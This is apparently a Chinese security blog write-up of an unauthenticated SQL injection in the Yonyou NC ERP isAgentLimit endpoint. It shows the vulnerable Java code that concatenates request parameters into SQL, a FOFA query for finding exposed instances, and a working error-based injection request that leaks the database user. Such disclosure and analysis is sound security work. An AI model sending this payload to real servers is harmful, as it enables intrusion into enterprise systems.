---
title: "用友NC isAgentLimit SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-isAgentLimit-agent-sqli.html
asset_dir: assets/用友nc-isagentlimit-sql注入漏洞
---

# 用友NC isAgentLimit SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/26 22:13
- 1236浏览
- [0评论](#comment)
- 17分钟阅读

深入探索

企业资源规划

企业资源计划

安全运维咨询

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友") NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC isAgentLimit 接口处pk\_flowagent参数存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。

SQL注入防护

# 影响版本

NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

根据官方漏洞通告,NC系统的/portal/pt/oacoSchedulerEvents/isAgentLimit的参数pk\_flowagent存在SQL注入漏洞

[![用友NC isAgentLimit SQL注入漏洞](images/img-001-7eff74277ce3.webp)](https://image.mrxn.net/922964e92cdf46c481aeedfbfabad4cd.webp)

`isAgentLimit` 的业务逻辑实现如下

代码安全审计

```
@Action
    public void isAgentLimit() throws BusinessException {
        String pk_flowagent = this.getRequest().getParameter("pk_flowagent");
        String pk_byagent = this.getRequest().getParameter("pk_byagent");
        ISchedulerAgentQueryService agentQry = (ISchedulerAgentQueryService)NCLocator.getInstance().lookup(ISchedulerAgentQueryService.class);
        StringBuilder sql = new StringBuilder();
        sql.append("pk_agent='").append(pk_flowagent).append("' and pk_user='").append(pk_byagent).append("'").append(" and useflag='Y' ");
        sql.append("and '").append(new UFDateTime().toString()).append("' between startdate and stopdate ");
        SchedulerAgentVO[] agentvos = agentQry.getAgentVOsByCondition(sql.toString());
        if (agentvos != null && agentvos.length > 0) {
            this.outClientMessage("N", 0);
        } else {
            this.outClientMessage("Y", 0);
        }
    }
```

`pk_flowagent` 和 **pk\_byagent** 直接拼接进SQL语句，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞") ,两个参数均存在SQL注入漏洞，网上POC只提到了和官方通告一样的参数，而忽略了第二个参数。

漏洞预警服务

# 漏洞复现

```
GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_byagent=-1'and+1=utl_inaddr.get_host_name((select+user+from dual))-- HTTP/1.1
Host: nc65.mrxn.net
```

报错注入，成功回显当前数据库用户

[![用友NC isAgentLimit SQL注入漏洞](images/img-002-efdde670e8b2.webp)](https://image.mrxn.net/fec31da7f1bf4e58acd3ed2f1ba3a671.webp)

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=560`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
